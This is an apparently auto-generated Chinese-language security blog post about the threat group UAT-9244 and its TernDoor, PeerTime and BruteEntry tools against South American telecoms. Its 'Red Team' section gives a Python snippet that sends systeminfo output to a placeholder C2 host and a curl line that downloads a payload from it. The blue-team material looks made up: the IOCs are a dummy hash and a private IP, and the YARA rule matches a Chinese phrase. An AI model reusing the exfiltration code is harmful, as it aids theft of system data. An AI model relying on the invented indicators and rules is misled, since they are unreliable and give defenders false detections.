---
layout: post
title:  "中國駭客UAT-9244鎖定南美電信公司，散布Windows及Linux後門程式"
date:   2026-03-06 06:39:29 +0000
categories: [security]
severity: high
---

# 🔥 解析中國駭客組織 UAT-9244 的攻擊技術
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS: 8.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: `TernDoor`, `PeerTime`, `BruteEntry`, `eBPF`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: UAT-9244 攻擊組織利用的漏洞主要是基於對電信服務供應商的網路環境進行長期滲透和監控。其中，TernDoor 是一種針對 Windows 電腦的後門程式，主要功能包括建立 C2 通訊、透過遠端 Shell 建立處理程序並執行攻擊者的指令、讀取及寫入檔案、收集系統資訊等。
* **攻擊流程圖解**: 
  1. 攻擊者首先使用 BruteEntry 進行暴力破解，嘗試登入目標系統。
  2. 一旦登入成功，攻擊者會部署 TernDoor 後門程式，建立 C2 通訊。
  3. TernDoor 收集系統資訊並上報給攻擊者。
  4. 攻擊者透過 TernDoor 執行遠端命令，進一步滲透目標網路。
* **受影響元件**: Windows 電腦、Linux 主機、物聯網設備與網路設備。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要有目標系統的登入權限。
* **Payload 建構邏輯**:

    ```
    
    python
      # TernDoor Payload 範例
      import socket
      import subprocess
    
      # 建立 C2 通訊
      c2_server = 'c2_server_ip'
      c2_port = 8080
    
      # 收集系統資訊
      system_info = subprocess.check_output(['systeminfo']).decode('utf-8')
    
      # 上報給攻擊者
      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      sock.connect((c2_server, c2_port))
      sock.sendall(system_info.encode('utf-8'))
    
    ```
  *範例指令*: 使用 `curl` 命令下載 TernDoor Payload。

```

bash
  curl -o ternDoor.exe http://c2_server_ip/ternDoor.exe

```
* **繞過技術**: 攻擊者可能使用 WAF 繞過技巧，例如使用加密通訊或隱藏在合法流量中。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | c2_server_ip | C:\Windows\Temp\ternDoor.exe |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
      rule TernDoor_Detection {
        meta:
          description = "TernDoor 後門程式偵測"
          author = "Blue Team"
        strings:
          $a = "TernDoor" ascii
          $b = "C2 通訊" ascii
        condition:
          all of them
      }
    
    ```
  或者是具體的 SIEM 查詢語法 (Splunk/Elastic)。

```

sql
  index=security sourcetype=windows_security EventCode=4688 | regex "TernDoor" | stats count as num_events by src_ip

```
* **緩解措施**: 除了更新修補之外，還可以修改系統設定，例如限制登入權限、監控系統資訊收集等。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **TernDoor (後門程式)**: 想像一扇秘密門，讓攻擊者可以進出目標系統。技術上是指一種可以建立 C2 通訊、收集系統資訊、執行遠端命令的程式。
* **PeerTime (P2P 後門程式)**: 想像一種點對點的通訊方式，讓攻擊者可以與目標系統進行直接通訊。技術上是指一種可以建立 P2P 通訊、收集系統資訊、執行遠端命令的程式。
* **BruteEntry (暴力破解工具)**: 想像一把萬能鑰匙，讓攻擊者可以嘗試所有可能的密碼。技術上是指一種可以進行暴力破解、嘗試登入目標系統的工具。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.ithome.com.tw/news/174230)
- [MITRE ATT&CK 編號](https://attack.mitre.org/techniques/T1190/)


